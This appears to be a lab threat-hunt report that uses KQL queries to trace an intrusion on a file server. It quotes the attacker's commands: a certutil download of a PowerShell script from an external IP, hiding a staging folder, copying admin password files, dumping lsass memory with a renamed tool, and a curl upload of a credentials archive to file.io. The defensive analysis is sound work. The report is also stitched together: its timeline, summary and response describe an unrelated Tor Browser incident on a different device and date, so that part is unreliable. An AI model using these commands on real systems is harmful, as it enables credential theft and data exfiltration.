<img width="1177" height="237" alt="image" src="https://github.com/user-attachments/assets/3c6611d0-7248-45ba-9973-41bb519bba92" />

# Threat Hunt Report: Unauthorized Data Transfer and Lateral Movement
- [Scenario](https://www.notion.so/Memo-Azuki-Import-Export-Trading-2b0cf57416ff804f8d23ecac0d2b60e9)

## Platforms and Languages Leveraged
- Log Analytics Workspaces (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

##  Scenario
After an attacker establised initial access on November 19th, network monitoring detected the attacker returning approximately 72 hours later. Suspicious lateral movement and large data transfers were observed overnight on the file server.

### High-Level TOR-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for any creation or modification of archives and dump files such as `.tar .gz .dmp` within hidden system directories such as `DeviceFileEvents`
- **Check `DeviceProcessEvents`** for any uses of native utilities like `certutil.exe regedit.exe curl.exe` being used to download scripts, modify registery keys, or exfiltrate data.
- **Check `DeviceFileEvents`** for any creation of unauthorized archives in hidden staging paths like `C:\Windows\Logs\CBS\`

---

## Discovery steps and findings

### 1. Searched the `DeviceLogonEvents` Table to find the source IP of the return connection and compromised file server

The source IP of the return connection is 159.26.106.98, as shown in the result logs. It is in the Remote IP field. The known breached account name is “kenji.sato” from part 1. Azuki was the given DeviceName field. The compromised file server is azuki-fileserver01. Although the logon failed, the bad actor still attempted to log into this.

**Query used to locate events:**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki" 
| where AccountName == "kenji.sato"
| sort by TimeGenerated asc
| project TimeGenerated,DeviceName, AccountName, ActionType, RemoteIP
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/c962c06e-1361-42a4-8c6b-7e6449124ae8">

---

### 2. Searched the `DeviceLogonEvents` Table to find the compromised administrator account

The compromised administrator account is fileadmin as it was used to connect to the file server with suspicious activity.

**Query used to locate event:**

```kql
DeviceLogonEvents
| where ActionType == "LogonSuccess"
| where LogonType == "RemoteInteractive"
| where DeviceName == "azuki-fileserver01"
| project TimeGenerated,DeviceName, AccountName, ActionType, RemoteIP, InitiatingProcessCommandLine

```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/c4ec7409-50bd-49df-bf66-5a313e906a6c">

---

### 3. Searched the `DeviceProcessEvents` Table to find the command to enumerate local network shares and to enumerate remote shares

The command the attacker used is “net share” to enumerate the local network shares and used the command "net.exe" view \\10.1.0.188 to enumerate remote shares. I first queried the process command line to have any “share” in it to see what the attacker used for network shares on the file server. I found out they used “net.exe” so I searched for that in the process command line and found the local network share command and remote share enumeration command.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("share")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/25c6da3b-3d77-4c9f-add7-a0ce06c3c064">

---

**Second query used to locate events:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("net.exe")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

<img width="1212" alt="image" src="https://github.com/user-attachments/assets/cd13ca91-7134-4788-ac31-da10990048f9">

---

### 4. Searched the `DeviceProcessEvents` Table to find the command to enumerate user privileges

The attacker used the command “whoami /all” to enumerate their user privileges which allowed them to understand what privileges they currently have and what they can and cannot do.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "whoami"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/a20a2469-a73b-43fc-bad6-06c45dcb3fea">

---

### 5. Searched the `DeviceProcessEvents` Table to find the command to enumerate network configuration

The attacker used the command “ipconfig /all” to enumerate network configuration. This helped the attacker gain information about their target system.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "ipconfig"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/b9209c61-93f5-49d9-a179-23145448ebd0">

---

### 6. Searched the `DeviceProcessEvents` Table to find the command used to hide the staging directory

The attacker used the command “attrib +h +s C:\Windows\Logs\CBS” to hide the staging directory which hides directories to evade discovery. The path of the directory is “C:\Windows\Logs\CBS”.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "attrib"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/510e92e6-ff74-4743-bf53-36c278fcb7fb">

---

### 7. Searched the `DeviceProcessEvents` Table to find the command used to download the PowerShell script

The attacker used the command “"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1” to retrieve a script and store it in the staging directory.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "C:\\Windows\\Logs\\CBS"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/16510f66-b796-4727-9b08-778d200ec68d">

---

### 8. Searched the `DeviceFileEvents` Table to find the credential file created in the staging directory

The attacker created a file named “IT-Admin-Passwords.csv” which had all the credential files and saved it in the staging directory.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where FileName endswith "csv"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/62f1355e-0b57-4f70-85fc-a4f4f86e1c87">

---

### 9. Searched the `DeviceFileEvents` Table to find the command used to stage data from a network share

The attacker used the command “xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y” to stage the data to from the network share so that they are less likely to trigger security alerts.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains "xcopy"
| where FileName == "IT-Admin-Passwords.csv"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/dfa7a6d3-fce1-428f-91d7-4551bbade306">

---

### 10. Searched the `DeviceFileEvents` Table to find the command used to compress the staged collection data

The attacker compressed the data using a cross platform tool called “tar”. This is the command the attacker used “"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .”

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains ".tar"
| project TimeGenerated, FileName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/f7bf9883-cda1-4487-8103-d72783bc2098">

---

### 11. Searched the `DeviceFileEvents` Table to find the renamed credential dumping tool

The attacker renamed a credential dumping tool to “pd.exe” as an inconspicuous file name to evade detection.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where ActionType == "FileCreated"
| where FileName endswith ".exe"
| where FolderPath contains "C:\\Windows\\Logs\\CBS"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/2fae398b-f148-4fdd-87f2-d7c919bda18b">

---

### 12. Searched the `DeviceFileEvents` Table to find the command used by attacker to dump process memory for credential extraction

The attacker used pd.exe to have a complete process memory dump using the command “"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp”

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains "pd.exe"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/94dbfab6-d100-42ad-a8f4-536976a477b3">

---

### 13. Searched the `DeviceFileEvents` Table to find the command used by attacker to exfiltrate the staged data

The attacker used an outbound HTTP request to upload the compressed archive to an external endpoint. This is the command used by the attacker "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. The cloud service used was “file.io”.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains "curl"
| where RemotePort == "443"
| project TimeGenerated, DeviceName,RemotePort, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/6653ad22-343d-4a39-896c-384bf23f433a">

---


## Chronological Event Timeline 

Incident Timeline: Tor Browser Usage
Date: March 16, 2026
Device Name: threat-hunt-lab
Account: myvmwindows

## Phase 1: Tor Browser Download & Installation
00:38:02 UTC | File Download
- Event: A file named tor-browser-windows-x86_64-portable-15.0.7.exe was downloaded or moved into the user's Downloads directory.
- Path: C:\Users\myvmWindows\Downloads\tor-browser-windows-x86_64-portable-15.0.7.exe

00:46:04 UTC | Installer Execution (Evasion Attempt)
Event: The Tor Browser portable installer was executed from the Downloads folder. The user appended the /S command-line switch to run the installer silently, preventing installation prompts from appearing on the screen.
SHA256: 958626901dbe17fc003ed671b61b3656375e6f0bc06c9dff60bd2f80d4ace21b

00:46:21 UTC - 00:46:32 UTC | Tor Components & Shortcut Creation
Event: The silent installation extracted multiple Tor-related files to a new folder on the Desktop (C:\Users\myvmWindows\Desktop\Tor Browser\). Core files created included tor.exe and various license text files (tor.txt, Torbutton.txt, Tor-Launcher.txt).
Event: A shortcut file named Tor Browser.lnk was created on the user's Desktop for quick access.

## Phase 2: Browser Execution & Local Configuration
00:47:47 UTC - 00:47:51 UTC | Tor Browser Launch
Event: The user launched the Tor Browser. This initiated multiple instances of firefox.exe (which is the modified core engine for the Tor Browser) from the C:\Users\myvmWindows\Desktop\Tor Browser\Browser\ directory.

00:47:52 UTC | Tor Daemon Started
- Event: The primary tor.exe process was spawned with extensive command-line arguments to establish the local Tor proxy. It bound the Control Port to 127.0.0.1:9151 and the SOCKS proxy to 127.0.0.1:9150.
- Path: C:\Users\myvmWindows\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe

## Phase 3: Network Connectivity & Active Browsing
00:48:21 UTC | Local Proxy Connection
Event: The firefox.exe browser process successfully made a local network connection to 127.0.0.1 on port 9150 to route its web traffic through the local Tor SOCKS proxy.

00:48:23 UTC - 00:48:28 UTC | Tor Network Circuits Established
Event: The tor.exe daemon successfully made outbound network connections to known remote Tor entry nodes to establish circuits.
Connections: * 23.129.64.147 over port 443
213.164.193.245 over port 9001
192.42.116.51 over port 443

00:48:46 UTC - 00:54:23 UTC | Active Browsing Session
Event: Multiple child processes of firefox.exe were continually created. These correspond to the user opening new tabs, utility workers, and interacting with websites within the Tor Browser.

00:59:23 UTC | Additional Tor Network Connection
Event: tor.exe established another successful outbound connection to 51.15.206.7 over port 443, likely rotating circuits or fetching additional consensus data.

## Phase 4: Post-Browsing Artifact Creation
02:28:55 UTC | Suspicious File Creation
Event: A new text file named tor-shopping-list.txt was created in the user's Documents folder.
Path: C:\Users\myvmWindows\Documents\tor-shopping-list.txt

02:28:56 UTC | Recent Files Update
Event: A Windows shortcut artifact (tor-shopping-list.lnk) was generated in the AppData\Roaming\Microsoft\Windows\Recent\ directory, confirming the user actively interacted with and opened the newly created shopping list document following their Tor browsing session.

---

## Summary

On the evening of March 15, 2026 (local time), the user myvmwindows downloaded and performed a silent installation of the Tor Browser. After establishing a connection to the Tor network and engaging in an active browsing session, the user created a document titled tor-shopping-list.txt. The entire sequence suggests a deliberate attempt to browse anonymously and document findings or intended purchases.

---

## Response Taken

TOR usage was confirmed on the endpoint `threat-hunt-lab` by the user `myvmwindows`. The device was isolated and the user's direct manager was notified.

---
